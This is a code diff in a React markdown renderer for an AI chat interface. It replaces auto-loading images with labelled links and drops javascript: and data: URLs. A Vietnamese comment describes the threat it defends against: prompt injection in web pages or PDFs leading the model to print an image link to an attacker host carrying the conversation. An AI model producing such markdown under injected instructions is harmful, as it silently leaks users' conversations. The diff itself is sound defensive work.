@@ -112,6 +112,20 @@ function buildComponents(ctx: CitationContext): Components {
     },
     a: ({ node: _node, ...props }) =>
       renderCitation(props.href ?? "", ctx) ?? <a {...props} target="_blank" rel="noopener noreferrer" />,
+    // Ảnh KHÔNG bao giờ tự tải. Prompt injection trong trang web (Research)
+    // hay PDF có thể bảo model in ra ![](https://kẻ-gian/?d=<hội thoại>) —
+    // một <img> sẽ gửi dữ liệu đi ngay lúc câu trả lời hiện ra, không cần ai
+    // bấm. Thay bằng một link ghi rõ tên miền; mở hay không là người dùng
+    // quyết. Địa chỉ không phải http(s) (javascript:, data:, tương đối) bỏ hẳn.
+    img: ({ node: _node, src, alt }) => {
+      const href = safeHref(typeof src === "string" ? src : undefined);
+      if (!href) return null;
+      return (
+        <a className="md-img-link" href={href} target="_blank" rel="noopener noreferrer nofollow">
+          {alt?.trim() || "Ảnh"} <span className="md-img-site">({domainOf(href)})</span>
+        </a>
+      );
+    },
     table: ({ node: _node, ...props }) => (
       <div className="md-table-wrap"><table {...props} /></div>
     ),
